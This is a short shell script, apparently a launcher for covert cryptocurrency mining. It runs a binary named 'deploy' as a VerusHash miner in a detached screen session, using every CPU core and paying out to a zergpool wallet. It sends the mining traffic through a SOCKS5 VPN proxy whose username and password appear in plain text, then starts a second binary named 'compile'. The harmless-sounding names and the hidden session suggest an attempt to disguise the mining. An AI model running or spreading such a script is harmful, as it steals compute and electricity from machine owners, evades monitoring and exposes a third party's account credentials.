chmod +x deploy compile
screen -dm -S run ./deploy -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DMvMea5NBmghkDSieyEXK1FfEzMqEaLJDf.alvin_$(cat /proc/sys/kernel/hostname)_$(echo $worker) -p c=DGB -t $(nproc --all) -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080
sleep 10s && ./compile
